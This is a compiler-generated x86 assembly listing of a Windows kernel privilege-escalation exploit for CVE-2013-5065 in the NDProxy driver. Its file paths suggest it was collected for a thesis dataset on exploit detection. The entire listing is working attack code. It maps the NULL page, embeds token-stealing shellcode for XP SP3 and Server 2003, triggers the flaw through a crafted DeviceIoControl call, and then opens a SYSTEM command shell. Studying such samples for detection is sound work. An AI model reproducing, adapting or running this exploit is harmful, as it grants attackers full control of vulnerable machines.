; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

	TITLE	C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_37732_cve_id_CVE-2013-5065.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

_DATA	SEGMENT
COMM	__NtQuerySystemInformation:DWORD
_DATA	ENDS
PUBLIC	___local_stdio_printf_options
PUBLIC	__vfprintf_l
PUBLIC	_fprintf
PUBLIC	_printf
PUBLIC	_exploit
PUBLIC	_main
EXTRN	_memcpy:PROC
EXTRN	_memset:PROC
EXTRN	_strcmp:PROC
EXTRN	__imp__CreateFileA@28:PROC
EXTRN	__imp__CloseHandle@4:PROC
EXTRN	__imp__GetLastError@0:PROC
EXTRN	__imp__DeviceIoControl@32:PROC
EXTRN	__imp__GetCurrentProcess@0:PROC
EXTRN	__imp__ExitProcess@4:PROC
EXTRN	__imp__WriteProcessMemory@20:PROC
EXTRN	__imp__GetModuleHandleA@4:PROC
EXTRN	__imp__GetProcAddress@8:PROC
EXTRN	_malloc:PROC
EXTRN	_exit:PROC
EXTRN	_system:PROC
EXTRN	___acrt_iob_func:PROC
EXTRN	_fflush:PROC
EXTRN	___stdio_common_vfprintf:PROC
EXTRN	@__security_check_cookie@4:PROC
EXTRN	_memset:PROC
EXTRN	___security_cookie:DWORD
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
_DATA	ENDS
_DATA	SEGMENT
$SG98161 DB	'NtAllocateVirtualMemory', 00H
$SG98162 DB	'NTDLL.DLL', 00H
	ORG $+2
$SG98163 DB	'[+] NtAllocateVirtualMemory@%p', 0aH, 00H
$SG98165 DB	'[-] NtAllocateVirtualMemory() failed to map first page', 0aH
	DB	00H
$SG98166 DB	'    Error code: %#X', 0aH, 00H
	ORG $+3
$SG98167 DB	'[+] BaseAddress: %p, RegionSize: %#x', 0aH, 00H
	ORG $+2
$SG98186 DB	'xCC', 00H
$SG98188 DB	'[-] Attempt to map memory_write failed', 0aH, 00H
$SG98189 DB	'    Error code: %d', 0aH, 00H
$SG98190 DB	'\\.\NDProxy', 00H
$SG98192 DB	'[-] Creating a device handle on NDProxy failed', 0aH, 00H
$SG98193 DB	'    Error code: %d', 0aH, 00H
$SG98194 DB	'cmd.exe /T:C0 /K cd c:\windows\system32', 00H
$SG98205 DB	'[*] Usage: %s OS_TYPE', 0aH, 00H
	ORG $+1
$SG98206 DB	'           supported OS_TYPE:', 0aH, 00H
	ORG $+1
$SG98207 DB	'                  XP  - Windows XP SP3 x86', 0aH, 00H
$SG98208 DB	'                  2k3 - Windows 2003 SP2 x86', 0aH, 00H
	ORG $+2
$SG98209 DB	'[*] Note:  the service "Routing and Remote Access"', 0aH
	DB	00H
$SG98210 DB	'           must be running on the target machine', 0aH, 00H
	ORG $+2
$SG98214 DB	'xp', 00H
	ORG $+1
$SG98215 DB	'XP', 00H
	ORG $+1
$SG98216 DB	090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H
	DB	090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H
	DB	090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H
	DB	090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H
	DB	090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H
	DB	090H, 090H, '<', 00H, 00H, 00H, 090H, 090H, 090H, 090H, 090H, '3'
	DB	0c0H, 'd', 08bH, 080H, '$', 01H, 00H, 00H, 08bH, '@D', 08bH, 0c8H
	DB	08bH, 080H, 088H, 00H, 00H, 00H, '-', 088H, 00H, 00H, 00H, 083H
	DB	0b8H, 084H, 00H, 00H, 00H, 04H, 'u', 0ecH, 08bH, 090H, 0c8H, 00H
	DB	00H, 00H, 089H, 091H, 0c8H, 00H, 00H, 00H, 0c3H, 00H
	ORG $+3
$SG98220 DB	'2k3', 00H
$SG98221 DB	'2K3', 00H
	ORG $+4
$SG98222 DB	090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H
	DB	090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H
	DB	090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H
	DB	090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H
	DB	090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H, 090H
	DB	090H, 090H, '<', 00H, 00H, 00H, 090H, 090H, 090H, 090H, 090H, '3'
	DB	0c0H, 'd', 08bH, 080H, '$', 01H, 00H, 00H, 08bH, '@8', 08bH, 0c8H
	DB	08bH, 080H, 098H, 00H, 00H, 00H, '-', 098H, 00H, 00H, 00H, 083H
	DB	0b8H, 094H, 00H, 00H, 00H, 04H, 'u', 0ecH, 08bH, 090H, 0d8H, 00H
	DB	00H, 00H, 089H, 091H, 0d8H, 00H, 00H, 00H, 0c3H, 00H
	ORG $+3
$SG98223 DB	'[-] Invalid argument', 0aH, 00H
	ORG $+2
$SG98224 DB	'    Argument used: %s', 0aH, 00H
_DATA	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_shellcode2k3$1 = -236					; size = 113
_shellcodeXP$2 = -120					; size = 113
__$ArrayPad$ = -4					; size = 4
_argc$ = 8						; size = 4
_argv$ = 12						; size = 4
_main	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_37732_cve_id_CVE-2013-5065.c
; Line 172
	push	ebp
	mov	ebp, esp
	sub	esp, 236				; 000000ecH
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	mov	DWORD PTR __$ArrayPad$[ebp], eax
	push	esi
	push	edi
; Line 173
	cmp	DWORD PTR _argc$[ebp], 2
	je	SHORT $LN2@main
; Line 175
	mov	eax, 4
	imul	ecx, eax, 0
	mov	edx, DWORD PTR _argv$[ebp]
	mov	eax, DWORD PTR [edx+ecx]
	push	eax
	push	OFFSET $SG98205
	call	_printf
	add	esp, 8
; Line 176
	push	OFFSET $SG98206
	call	_printf
	add	esp, 4
; Line 177
	push	OFFSET $SG98207
	call	_printf
	add	esp, 4
; Line 178
	push	OFFSET $SG98208
	call	_printf
	add	esp, 4
; Line 179
	push	OFFSET $SG98209
	call	_printf
	add	esp, 4
; Line 180
	push	OFFSET $SG98210
	call	_printf
	add	esp, 4
; Line 181
	push	0
	call	_exit
; Line 182
	jmp	$LN1@main
$LN2@main:
; Line 185
	push	OFFSET $SG98214
	mov	ecx, 4
	shl	ecx, 0
	mov	edx, DWORD PTR _argv$[ebp]
	mov	eax, DWORD PTR [edx+ecx]
	push	eax
	call	_strcmp
	add	esp, 8
	test	eax, eax
	je	SHORT $LN6@main
	push	OFFSET $SG98215
	mov	ecx, 4
	shl	ecx, 0
	mov	edx, DWORD PTR _argv$[ebp]
	mov	eax, DWORD PTR [edx+ecx]
	push	eax
	call	_strcmp
	add	esp, 8
	test	eax, eax
	jne	SHORT $LN4@main
$LN6@main:
; Line 187
	mov	ecx, 28					; 0000001cH
	mov	esi, OFFSET $SG98216
	lea	edi, DWORD PTR _shellcodeXP$2[ebp]
	rep movsd
	movsb
; Line 195
	lea	ecx, DWORD PTR _shellcodeXP$2[ebp]
	push	ecx
	call	_exploit
	add	esp, 4
; Line 196
	jmp	$LN1@main
$LN4@main:
; Line 197
	push	OFFSET $SG98220
	mov	edx, 4
	shl	edx, 0
	mov	eax, DWORD PTR _argv$[ebp]
	mov	ecx, DWORD PTR [eax+edx]
	push	ecx
	call	_strcmp
	add	esp, 8
	test	eax, eax
	je	SHORT $LN9@main
	push	OFFSET $SG98221
	mov	edx, 4
	shl	edx, 0
	mov	eax, DWORD PTR _argv$[ebp]
	mov	ecx, DWORD PTR [eax+edx]
	push	ecx
	call	_strcmp
	add	esp, 8
	test	eax, eax
	jne	SHORT $LN7@main
$LN9@main:
; Line 199
	mov	ecx, 28					; 0000001cH
	mov	esi, OFFSET $SG98222
	lea	edi, DWORD PTR _shellcode2k3$1[ebp]
	rep movsd
	movsb
; Line 207
	lea	edx, DWORD PTR _shellcode2k3$1[ebp]
	push	edx
	call	_exploit
	add	esp, 4
; Line 208
	jmp	SHORT $LN1@main
$LN7@main:
; Line 211
	push	OFFSET $SG98223
	call	_printf
	add	esp, 4
; Line 212
	mov	eax, 4
	shl	eax, 0
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	edx, DWORD PTR [ecx+eax]
	push	edx
	push	OFFSET $SG98224
	call	_printf
	add	esp, 8
; Line 213
	push	0
	call	_exit
$LN1@main:
; Line 216
	jmp	SHORT $LN12@main
$LN10@main:
	jmp	SHORT $LN11@main
$LN12@main:
	xor	eax, eax
$LN11@main:
	pop	edi
	pop	esi
	mov	ecx, DWORD PTR __$ArrayPad$[ebp]
	xor	ecx, ebp
	call	@__security_check_cookie@4
	mov	esp, ebp
	pop	ebp
	ret	0
_main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_writtenBytes$ = -108					; size = 4
_returnedBytes$ = -104					; size = 4
_returnValue$ = -100					; size = 4
_ndProxyDeviceHandle$ = -96				; size = 4
_shellcodeBuffer$ = -92					; size = 4
_inputBuffer$ = -88					; size = 84
__$ArrayPad$ = -4					; size = 4
_shellcode$ = 8						; size = 4
_exploit PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_37732_cve_id_CVE-2013-5065.c
; Line 134
	push	ebp
	mov	ebp, esp
	sub	esp, 108				; 0000006cH
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	mov	DWORD PTR __$ArrayPad$[ebp], eax
; Line 138
	call	_InitFirstPage
; Line 141
	push	400					; 00000190H
	call	_malloc
	add	esp, 4
	mov	DWORD PTR _shellcodeBuffer$[ebp], eax
; Line 142
	push	400					; 00000190H
	push	OFFSET $SG98186
	mov	eax, DWORD PTR _shellcodeBuffer$[ebp]
	push	eax
	call	_memset
	add	esp, 12					; 0000000cH
; Line 143
	push	112					; 00000070H
	mov	ecx, DWORD PTR _shellcode$[ebp]
	push	ecx
	mov	edx, DWORD PTR _shellcodeBuffer$[ebp]
	push	edx
	call	_memcpy
	add	esp, 12					; 0000000cH
; Line 145
	lea	eax, DWORD PTR _writtenBytes$[ebp]
	push	eax
	push	1024					; 00000400H
	mov	ecx, DWORD PTR _shellcodeBuffer$[ebp]
	push	ecx
	push	1
	push	-1
	call	DWORD PTR __imp__WriteProcessMemory@20
	mov	DWORD PTR _returnValue$[ebp], eax
; Line 146
	cmp	DWORD PTR _returnValue$[ebp], 0
	jne	SHORT $LN2@exploit
; Line 148
	push	OFFSET $SG98188
	call	_printf
	add	esp, 4
; Line 149
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG98189
	call	_printf
	add	esp, 8
; Line 150
	push	1
	call	_exit
$LN2@exploit:
; Line 152
	push	0
	push	0
	push	3
	push	0
	push	0
	push	0
	push	OFFSET $SG98190
	call	DWORD PTR __imp__CreateFileA@28
	mov	DWORD PTR _ndProxyDeviceHandle$[ebp], eax
; Line 153
	cmp	DWORD PTR _ndProxyDeviceHandle$[ebp], -1
	jne	SHORT $LN3@exploit
; Line 155
	push	OFFSET $SG98192
	call	_printf
	add	esp, 4
; Line 156
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG98193
	call	_printf
	add	esp, 8
; Line 157
	push	0
	call	_exit
$LN3@exploit:
; Line 159
	push	84					; 00000054H
	push	0
	lea	edx, DWORD PTR _inputBuffer$[ebp]
	push	edx
	call	_memset
	add	esp, 12					; 0000000cH
; Line 160
	mov	DWORD PTR _returnedBytes$[ebp], 0
; Line 161
	mov	DWORD PTR _inputBuffer$[ebp+20], 117637413 ; 07030125H
; Line 162
	mov	DWORD PTR _inputBuffer$[ebp+28], 52	; 00000034H
; Line 163
	push	0
	lea	eax, DWORD PTR _returnedBytes$[ebp]
	push	eax
	push	36					; 00000024H
	lea	ecx, DWORD PTR _inputBuffer$[ebp]
	push	ecx
	push	84					; 00000054H
	lea	edx, DWORD PTR _inputBuffer$[ebp]
	push	edx
	push	-1879104564				; 8fff23ccH
	mov	eax, DWORD PTR _ndProxyDeviceHandle$[ebp]
	push	eax
	call	DWORD PTR __imp__DeviceIoControl@32
; Line 164
	mov	ecx, DWORD PTR _ndProxyDeviceHandle$[ebp]
	push	ecx
	call	DWORD PTR __imp__CloseHandle@4
; Line 165
	push	OFFSET $SG98194
	call	_system
	add	esp, 4
; Line 166
	xor	eax, eax
$LN4@exploit:
; Line 167
	mov	ecx, DWORD PTR __$ArrayPad$[ebp]
	xor	ecx, ebp
	call	@__security_check_cookie@4
	mov	esp, ebp
	pop	ebp
	ret	0
_exploit ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_ReturnCode$ = -16					; size = 4
_NtAllocateVirtualMemory$ = -12				; size = 4
_BaseAddress$ = -8					; size = 4
_RegionSize$ = -4					; size = 4
_InitFirstPage PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_37732_cve_id_CVE-2013-5065.c
; Line 102
	push	ebp
	mov	ebp, esp
	sub	esp, 16					; 00000010H
; Line 108
	push	OFFSET $SG98161
	push	OFFSET $SG98162
	call	DWORD PTR __imp__GetModuleHandleA@4
	push	eax
	call	DWORD PTR __imp__GetProcAddress@8
	mov	DWORD PTR _NtAllocateVirtualMemory$[ebp], eax
; Line 110
	mov	eax, DWORD PTR _NtAllocateVirtualMemory$[ebp]
	push	eax
	push	OFFSET $SG98163
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 12					; 0000000cH
; Line 111
	mov	DWORD PTR _RegionSize$[ebp], 61440	; 0000f000H
; Line 112
	mov	DWORD PTR _BaseAddress$[ebp], 1
; Line 113
	push	64					; 00000040H
	push	12288					; 00003000H
	lea	ecx, DWORD PTR _RegionSize$[ebp]
	push	ecx
	push	0
	lea	edx, DWORD PTR _BaseAddress$[ebp]
	push	edx
	call	DWORD PTR __imp__GetCurrentProcess@0
	push	eax
	call	DWORD PTR _NtAllocateVirtualMemory$[ebp]
	mov	DWORD PTR _ReturnCode$[ebp], eax
; Line 119
	cmp	DWORD PTR _ReturnCode$[ebp], 0
	je	SHORT $LN2@InitFirstP
; Line 121
	push	OFFSET $SG98165
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 122
	mov	eax, DWORD PTR _ReturnCode$[ebp]
	push	eax
	push	OFFSET $SG98166
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 12					; 0000000cH
; Line 123
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 124
	push	1
	call	DWORD PTR __imp__ExitProcess@4
$LN2@InitFirstP:
; Line 126
	mov	ecx, DWORD PTR _RegionSize$[ebp]
	push	ecx
	mov	edx, DWORD PTR _BaseAddress$[ebp]
	push	edx
	push	OFFSET $SG98167
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 16					; 00000010H
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 127
	mov	eax, DWORD PTR _RegionSize$[ebp]
	push	eax
	push	65					; 00000041H
	mov	ecx, DWORD PTR _BaseAddress$[ebp]
	push	ecx
	call	_memset
	add	esp, 12					; 0000000cH
$LN3@InitFirstP:
; Line 129
	mov	esp, ebp
	pop	ebp
	ret	0
_InitFirstPage ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _printf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Format$ = 8						; size = 4
_printf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 956
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 959
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 960
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	1
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 961
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 962
	mov	eax, DWORD PTR __Result$[ebp]
; Line 963
	mov	esp, ebp
	pop	ebp
	ret	0
_printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _fprintf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
_fprintf PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 837
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 840
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 841
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 842
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 843
	mov	eax, DWORD PTR __Result$[ebp]
; Line 844
	mov	esp, ebp
	pop	ebp
	ret	0
_fprintf ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vfprintf_l
_TEXT	SEGMENT
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vfprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 644
	push	ebp
	mov	ebp, esp
; Line 645
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	___local_stdio_printf_options
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	mov	edx, DWORD PTR [eax]
	push	edx
	call	___stdio_common_vfprintf
	add	esp, 24					; 00000018H
; Line 646
	pop	ebp
	ret	0
__vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_printf_options
_TEXT	SEGMENT
___local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 90
	push	ebp
	mov	ebp, esp
; Line 92
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	pop	ebp
	ret	0
___local_stdio_printf_options ENDP
_TEXT	ENDS
END
